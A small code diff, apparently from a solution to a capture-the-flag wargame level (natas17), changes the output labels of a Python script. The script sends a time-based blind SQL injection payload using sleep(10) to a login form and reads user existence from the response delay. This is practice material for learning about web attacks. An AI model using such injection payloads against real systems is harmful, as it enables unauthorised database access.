@@ -46,14 +46,14 @@ data = {
     "submit" : "submit"
 }
 response = session.post(URL, data=data)
-print(f"example 1: time elapsed = {response.elapsed.total_seconds()}s")
+print(f"user does not exist: time elapsed = {response.elapsed.total_seconds()}s")
 
 data = {
     "username" : "natas18\" and sleep(10) # A ",
     "submit" : "submit"
 }
 response = session.post(URL, data=data)
-print(f"example 2: time elapsed = {response.elapsed.total_seconds()}s")
+print(f"user exists: time elapsed = {response.elapsed.total_seconds()}s")
 print('\n')
 # as we can see, the first request returned almost immediately as the user doesn't exist in the database
 # the second request, however, returned after 10 seconds, which is the sleep time that we set in the sleep() function
